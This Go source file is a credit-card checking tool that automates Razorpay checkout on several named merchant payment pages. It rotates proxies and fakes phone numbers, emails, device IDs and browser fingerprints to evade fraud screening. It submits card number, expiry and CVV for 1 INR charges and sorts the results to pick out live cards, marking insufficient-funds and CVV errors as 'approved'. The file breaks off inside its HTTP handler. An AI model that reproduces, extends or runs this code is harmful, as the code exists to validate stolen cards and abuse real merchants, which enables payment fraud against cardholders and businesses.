package main

import (
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	BUILD     = "9cb57fdf457e44eac4384e182f925070ff5488d9"
	BUILD_V1  = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
	PORT      = 7070
	TIMEOUT   = 45
	MAX_RETRY = 2
)

var razorpayURLs = []string{
	"https://pages.razorpay.com/lckuk-international",
	"https://pages.razorpay.com/iicdelhi",
	"https://razorpay.me/@onsiteteams",
	"https://razorpay.me/@getitservice",
	"https://razorpay.me/@plp",
}

var (
	urlIndex   uint64
	proxyIndex uint64
	mu         sync.Mutex
)

// ── Proxy handling ──────────────────────────────────────────────────────────
func formatProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	parts := strings.Split(raw, ":")
	if len(parts) == 4 {
		return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
	}
	if len(parts) == 2 {
		return fmt.Sprintf("http://%s:%s", parts[0], parts[1])
	}
	return "http://" + raw
}

func loadProxies(filepath string) []string {
	var proxies []string
	data, err := os.ReadFile(filepath)
	if err != nil {
		return proxies
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		formatted := formatProxy(line)
		if formatted != "" {
			proxies = append(proxies, formatted)
		}
	}
	return proxies
}

func getNextProxy(proxyList []string) string {
	if len(proxyList) == 0 {
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) - 1
	return proxyList[idx%uint64(len(proxyList))]
}

func getNextURL() string {
	if len(razorpayURLs) == 0 {
		return "https://pages.razorpay.com/lckuk-international"
	}
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

// ── Helpers ──────────────────────────────────────────────────────────────────
func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

func genUA() string {
	major := randInt(120, 147)
	build := randInt(5000, 6999)
	patch := randInt(50, 249)
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

func genIndianPhone() string {
	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
	rest := ""
	for i := 0; i < 9; i++ {
		rest += strconv.Itoa(randInt(0, 9))
	}
	return "+91" + first + rest
}

func genEmail() string {
	names := []string{"alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna"}
	return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func getBrand(cc string) string {
	if strings.HasPrefix(cc, "4") {
		return "visa"
	}
	if len(cc) >= 2 {
		switch cc[:2] {
		case "51", "52", "53", "54", "55":
			return "mastercard"
		case "34", "37":
			return "amex"
		}
	}
	if strings.HasPrefix(cc, "6011") || strings.HasPrefix(cc, "65") {
		return "discover"
	}
	return "unknown"
}

func findBetween(content, start, end string) string {
	si := strings.Index(content, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(content[si:], end)
	if ei == -1 {
		return ""
	}
	return content[si : si+ei]
}

func extractJSONVar(content, varName string) string {
	prefix := "var " + varName + " ="
	startIdx := strings.Index(content, prefix)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(prefix)

	for startIdx < len(content) && strings.ContainsRune(" \t\n\r", rune(content[startIdx])) {
		startIdx++
	}

	if startIdx >= len(content) || content[startIdx] != '{' {
		return ""
	}

	depth := 0
	inString := false
	escaped := false

	for i := startIdx; i < len(content); i++ {
		c := content[i]

		if escaped {
			escaped = false
			continue
		}
		if c == '\\' && inString {
			escaped = true
			continue
		}
		if c == '"' {
			inString = !inString
			continue
		}
		if inString {
			continue
		}
		if c == '{' {
			depth++
		} else if c == '}' {
			depth--
			if depth == 0 {
				return content[startIdx : i+1]
			}
		}
	}
	return ""
}

func generateRzpDeviceID() (string, string) {
	buf := make([]byte, 16)
	rand.Read(buf)
	h := sha1.Sum(buf)
	hStr := hex.EncodeToString(h[:])
	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
	rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
	return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 14)
	for i := 0; i < 14; i++ {
		n, _ := rand.Int(rand.Reader, big.NewInt(62))
		buf[i] = base62[n.Int64()]
	}
	return string(buf)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}

func getString(m map[string]interface{}, key, fallback string) string {
	if m == nil {
		return fallback
	}
	v, ok := m[key]
	if !ok {
		return fallback
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloat(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case int64:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

// ── BIN lookup ──────────────────────────────────────────────────────────────
func getBINInfo(cc string) map[string]string {
	bin := cc
	if len(bin) > 6 {
		bin = bin[:6]
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get("https://bins.antipublic.cc/bins/" + bin)
	if err != nil {
		return map[string]string{
			"brand": "-", "type": "-", "level": "-",
			"bank": "-", "country": "-", "flag": "🏳️",
		}
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var data map[string]interface{}
	json.Unmarshal(body, &data)

	return map[string]string{
		"brand":   getString(data, "brand", "-"),
		"type":    getString(data, "type", "-"),
		"level":   getString(data, "level", "-"),
		"bank":    getString(data, "bank", "-"),
		"country": getString(data, "country_name", "-"),
		"flag":    getString(data, "country_flag", "🏳️"),
	}
}

// ── HTTP client ─────────────────────────────────────────────────────────────
type FetchResponse struct {
	Body       string
	StatusCode int
	Headers    http.Header
}

func (r *FetchResponse) Text() string {
	return r.Body
}

func (r *FetchResponse) JSON() (map[string]interface{}, error) {
	var result map[string]interface{}
	err := json.Unmarshal([]byte(r.Body), &result)
	return result, err
}

type CustomFetch struct {
	client *http.Client
	ua     string
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        50,
		IdleConnTimeout:     30 * time.Second,
		MaxIdleConnsPerHost: 10,
		DisableCompression:  false,
		DisableKeepAlives:   false,
	}

	if proxyURL != "" {
		parsed, err := url.Parse(proxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy url: %w", err)
		}
		transport.Proxy = http.ProxyURL(parsed)
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   TIMEOUT * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}

	if ua == "" {
		ua = genUA()
	}

	return &CustomFetch{client: client, ua: ua}, nil
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil, err
	}

	if _, ok := headers["User-Agent"]; !ok {
		req.Header.Set("User-Agent", f.ua)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return &FetchResponse{
		Body:       string(respBody),
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
	}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	jsonBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/json"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/x-www-form-urlencoded"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

// ── Error classification ────────────────────────────────────────────────────
var balanceKeywords = []string{
	"insufficient account balance",
	"insufficient funds",
	"maximum transaction limit",
	"transaction limit exceeded",
	"balance insufficient",
}

var deadCodes = map[string]bool{
	"card_not_enrolled":         true,
	"payment_risk_check_failed": true,
	"card_declined":             true,
	"invalid_card_number":       true,
	"card_expired":              true,
	"expired_card":              true,
	"authentication_failed":     true,
	"payment_cancelled":         true,
	"payment_failed":            true,
	"card_disabled":             true,
	"lost_card":                 true,
	"stolen_card":               true,
	"fraudulent":                true,
}

var proxyErrorKeywords = []string{
	"ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
	"connection refused", "connection reset", "timeout",
	"no such host", "i/o timeout", "proxyconnect",
}

func isBalanceKeyword(msgLower string) bool {
	for _, k := range balanceKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

func isCVVKeyword(msgLower, errCode string) bool {
	if strings.Contains(msgLower, "cvv provided is incorrect") {
		return true
	}
	if strings.Contains(msgLower, "incorrect_cvv") {
		return true
	}
	if strings.Contains(msgLower, "cvv mismatch") {
		return true
	}
	if strings.ToLower(errCode) == "incorrect_cvv" {
		return true
	}
	return false
}

func isDeadCode(code string) bool {
	return deadCodes[strings.ToLower(code)]
}

func isProxyError(err error) bool {
	msg := strings.ToUpper(err.Error())
	for _, k := range proxyErrorKeywords {
		if strings.Contains(msg, strings.ToUpper(k)) {
			return true
		}
	}
	return false
}

func classifyResult(errorDesc, errorCode string) (string, string) {
	desc := strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
	desc = strings.TrimSpace(desc)
	if desc == "" {
		return "declined", "Unknown Decline"
	}

	descLower := strings.ToLower(desc)
	codeLower := strings.ToLower(errorCode)

	if strings.Contains(descLower, "razorpay_payment_id") ||
		strings.Contains(descLower, "payment successful") ||
		strings.Contains(descLower, "transaction success") {
		return "charged", desc
	}

	if isDeadCode(codeLower) || isDeadCode(descLower) {
		return "declined", desc
	}

	if isBalanceKeyword(descLower) {
		return "approved", desc
	}

	if isCVVKeyword(descLower, codeLower) {
		return "approved", desc
	}

	if strings.Contains(descLower, "limit") || strings.Contains(descLower, "exceed") {
		return "approved", desc
	}

	if strings.Contains(descLower, "declined") ||
		strings.Contains(descLower, "cancelled") ||
		strings.Contains(descLower, "failed") {
		return "declined", desc
	}

	return "declined", desc
}

// ── Card checker ────────────────────────────────────────────────────────────
type CheckResult struct {
	Status      string            `json:"status"`
	Message     string            `json:"response"`
	Proxy       string            `json:"proxy"`
	ProxyStatus string            `json:"proxy_status"`
	PaymentID   string            `json:"payment_id,omitempty"`
	OrderID     string            `json:"order_id,omitempty"`
	BIN         map[string]string `json:"bin,omitempty"`
}

func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}
	year, _ := strconv.Atoi("20" + yy2)
	brand := getBrand(cc)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	fetch, err := NewCustomFetch(proxyURL, ua)
	if err != nil {
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
	}
	defer fetch.client.CloseIdleConnections()

	// Step 1: Get payment page
	r1, err := fetch.Get(targetURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
	})
	if err != nil {
		if isProxyError(err) {
			return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
		}
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}
	r1Text := r1.Text()

	jsonStr := extractJSONVar(r1Text, "data")
	if jsonStr == "" {
		return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	var initData map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
		var inner string
		if err2 := json.Unmarshal([]byte(jsonStr), &inner); err2 == nil {
			if err3 := json.Unmarshal([]byte(inner), &initData); err3 != nil {
				return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data", Proxy: proxyURL, ProxyStatus: "LIVE"}
			}
		} else {
			return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data: " + truncate(err.Error(), 80), Proxy: proxyURL, ProxyStatus: "LIVE"}
		}
	}

	kyid := getString(initData, "key_id", "")
	if kyid == "" {
		kyid = getString(initData, "key", "")
	}
	if kyid == "" {
		return CheckResult{Status: "error", Message: "Razorpay Key ID not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	var plink, ppid string
	const forceAmount float64 = 100 // 1 INR in paise

	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getString(plObj, "id", "")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getString(item, "id", "")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getString(ppObj, "id", "")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getString(item, "id", "")
			}
		}
	}

	if plink == "" {
		return CheckResult{Status: "error", Message: "Payment Link ID not found in page structure", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	keylessHeader := getString(initData, "keyless_header", "")
	keylessHeaderURL := url.QueryEscape(keylessHeader)

	// Step 2: Create order
	r2Payload := map[string]interface{}{
		"notes":      map[string]string{"comment": "", "name": "User"},
		"line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
		map[string]string{
			"Accept":       "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin":       "https://pages.razorpay.com",
			"Referer":      "https://pages.razorpay.com/",
		},
		r2Payload,
	)
	if err != nil {
		if isProxyError(err) {
			return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
		}
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getString(orderObj, "id", "")
	if orderID == "" {
		errMsg := "Order creation failed"
		if e, ok := r2Data["error"].(map[string]interface{}); ok {
			desc := getString(e, "description", "")
			if desc != "" {
				errMsg = desc
			}
		}
		return CheckResult{Status: "error", Message: errMsg, Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}

	orderAmount := getFloat(orderObj, "amount")
	if orderAmount < 100 {
		orderAmount = forceAmount
	}
	orderCurrency := getString(orderObj, "currency", "INR")

	// Step 3: Get session token
	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":  "text/html,application/xhtml+xml,*/*",
			"Referer": "https://pages.razorpay.com/",
		},
	)
	if err != nil {
		if isProxyError(err) {
			return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
		}
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}
	r3Text := r3.Text()

	sessid := findBetween(r3Text, `window.session_token="`, `";`)
	if sessid == "" {
		re := regexp.MustCompile(`session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)
		m := re.FindStringSubmatch(r3Text)
		if len(m) >= 2 {
			sessid = m[1]
		}
	}
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		}
	}

	// Step 4: Preferences
	resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer",
		"customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config",
		"order", "invoice", "buyer_protection", "personalization"}
	queryArr := make([]map[string]string, 0, len(resources))
	for _, r := range resources {
		queryArr = append(queryArr, map[string]string{"resource": r})
	}

	r4Payload := map[string]interface{}{
		"query": queryArr,
		"query_params": map[string]interface{}{
			"device_id":       rzpDeviceID,
			"rtb_device_id":   fhash,
			"amount":          orderAmount,
			"currency":        orderCurrency,
			"option_currency": orderCurrency,
			"truecaller":      false,
			"qr_required":     false,
			"library":         "checkoutjs",
			"platform":        "browser",
			"order_id":        orderID,
			"payment_link_id": plink,
			"contact":         phone,
		},
		"action": "get",
	}

	h := stdHeaders()
	h["Content-Type"] = "application/json"
	fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
		h, r4Payload,
	)

	// Step 5: Checkout order
	form5 := url.Values{
		"notes[email]":          {email},
		"notes[phone]":          {phoneShort},
		"payment_link_id":       {plink},
		"key_id":                {kyid},
		"contact":               {phone},
		"email":                 {email},
		"currency":              {orderCurrency},
		"_[integration]":        {"payment_pages"},
		"_[device.id]":          {rzpDeviceID},
		"_[library]":            {"checkoutjs"},
		"_[library_src]":        {"no-src"},
		"_[current_script_src]": {"no-src"},
		"_[platform]":           {"browser"},
		"_[env]":                {""},
		"_[is_magic_script]":    {"false"},
		"_[os]":                 {"windows"},
		"_[shield][fhash]":      {fhash},
		"_[shield][tz]":         {"0"},
		"_[device_id]":          {rzpDeviceID},
		"_[build]":              {BUILD},
		"_[shield][os]":         {"windows"},
		"_[shield][platform]":   {"browser"},
		"_[shield][browser]":    {"chrome"},
		"_[request_index]":      {"0"},
		"amount":                {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":              {orderID},
		"method":                {"card"},
		"checkout_id":           {checkoutID},
	}

	h2 := stdHeaders()
	h2["Content-Type"] = "application/x-www-form-urlencoded"
	fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
		h2, form5,
	)

	// Step 6: Cross border flows
	r6Payload := map[string]interface{}{
		"identifiers": map[string]interface{}{
			"merchant":         map[string]string{"country": "IN"},
			"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
			"method":           "card",
			"payment_currency": orderCurrency,
		},
		"forex_charges": map[string]interface{}{
			"amount":   orderAmount,
			"currency": orderCurrency,
			"filters":  map[string]string{"method": "card"},
		},
	}

	h3 := stdHeaders()
	h3["Content-Type"] = "application/json"
	fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
		h3, r6Payload,
	)

	// Step 7: Create payment
	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

	form7 := url.Values{
		"user_risk_providers_token": {tokenCreate},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {"User"},
		"payment_link_id":           {plink},
		"key_id":                    {kyid},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {targetURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {"User"},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
	}

	r7, err := fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
		stdHeaders(),
		form7,
	)
	if err != nil {
		if isProxyError(err) {
			return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
		}
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	var r7Data map[string]interface{}
	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
		return CheckResult{Status: "error", Message: "Payment create response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	paymentID := getString(r7Data, "payment_id", "")
	if paymentID == "" {
		paymentID = getString(r7Data, "id", "")
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getString(errObj, "description", "")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getString(errObj, "reason", "")

		status, msg := classifyResult(errDesc, errCode)
		return CheckResult{Status: status, Message: msg, Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	// Step 8: 3DS Authentication
	pidClean := paymentID
	if idx := strings.Index(paymentID, "_"); idx != -1 {
		pidClean = paymentID[idx+1:]
	}

	authHeaders := map[string]string{"content-type": "application/x-www-form-urlencoded"}
	fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
		authHeaders,
		url.Values{},
	)

	time.Sleep(1 * time.Second)

	screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
	screen := screens[randInt(0, len(screens)-1)]
	depths := []int{24, 32}
	depth := depths[randInt(0, 1)]

	form8 := url.Values{
		"browser[java_enabled]":       {"false"},
		"browser[javascript_enabled]": {"true"},
		"browser[timezone_offset]":    {"0"},
		"browser[color_depth]":        {strconv.Itoa(depth)},
		"browser[screen_width]":       {strconv.Itoa(screen[0])},
		"browser[screen_height]":      {strconv.Itoa(screen[1])},
		"browser[language]":           {"en-US"},
		"auth_step":                   {"3ds2Auth"},
	}

	fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", pidClean),
		authHeaders,
		form8,
	)

	// Step 9: Final check
	r9, err := fetch.Get(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
		map[string]string{
			"Accept":          "*/*",
			"Content-type":    "application/x-www-form-urlencoded",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		},
	)
	if err != nil {
		if isProxyError(err) {
			return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
		}
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	finalText := r9.Text()

	if strings.Contains(finalText, "razorpay_payment_id") ||
		strings.Contains(finalText, `"status":"captured"`) ||
		strings.Contains(finalText, `"status":"authorized"`) {
		return CheckResult{
			Status:      "charged",
			Message:     "Payment Successful (1₹)",
			Proxy:       proxyURL,
			ProxyStatus: "LIVE",
			PaymentID:   paymentID,
			OrderID:     orderID,
			BIN:         getBINInfo(cc),
		}
	}

	var r9Data map[string]interface{}
	if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
		return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	errorObj, _ := r9Data["error"].(map[string]interface{})
	errorDesc := getString(errorObj, "description", "")
	errorDesc = strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
	errorDesc = strings.TrimSpace(errorDesc)
	errCode := getString(errorObj, "reason", "")

	label := errorDesc
	if errCode != "" {
		label = errorDesc + " (" + errCode + ")"
	}
	if label == "" {
		label = "Unknown Decline"
	}

	status, msg := classifyResult(errorDesc, errCode)
	return CheckResult{
		Status:      status,
		Message:     msg,
		Proxy:       proxyURL,
		ProxyStatus: "LIVE",
		PaymentID:   paymentID,
		OrderID:     orderID,
		BIN:         getBINInfo(cc),
	}
}

// ── Parsers ──────────────────────────────────────────────────────────────────
func parseCard(cardData string) (*struct{ CC, MM, YY, CVV string }, error) {
	cardData = strings.TrimSpace(cardData)
	separators := []string{"|", "/", " "}

	for _, sep := range separators {
		parts := strings.Split(cardData, sep)
		if len(parts) >= 4 {
			cc := strings.TrimSpace(parts[0])
			mm := strings.TrimSpace(parts[1])
			yy := strings.TrimSpace(parts[2])
			cvv := strings.TrimSpace(parts[3])

			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
				mmInt, _ := strconv.Atoi(mm)
				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
					return &struct{ CC, MM, YY, CVV string }{
						CC:  cc,
						MM:  fmt.Sprintf("%02d", mmInt),
						YY:  yy,
						CVV: cvv,
					}, nil
				}
			}
		}
	}
	return nil, errors.New("invalid card format")
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}

func isDigitsMM(s string) bool {
	return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
	return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
	return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

// ── Logging ──────────────────────────────────────────────────────────────────
func logResult(card, status, message, proxyDisplay, targetURL string) {
	log.Printf("[%s] %s | %s | %s | %s",
		strings.ToUpper(status),
		card[:6]+"****"+card[len(card)-4:],
		message,
		proxyDisplay,
		targetURL,
	)
}

func maskProxy(proxyURL, proxyStatus string) string {
	if proxyURL == "" {
		return "DIRECT [" + proxyStatus + "]"
	}
	parsed, err := url.Parse(proxyURL)
	if err == nil && parsed.Host != "" {
		return parsed.Scheme + "//" + parsed.Host + " [" + proxyStatus + "]"
	}
	masked := regexp.MustCompile(`//[^@]+@`).ReplaceAllString(proxyURL, "//***@")
	return masked + " [" + proxyStatus + "]"
}

// ── HTTP handler ────────────────────────────────────────────────────────────
func handler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	path := r.URL.Path
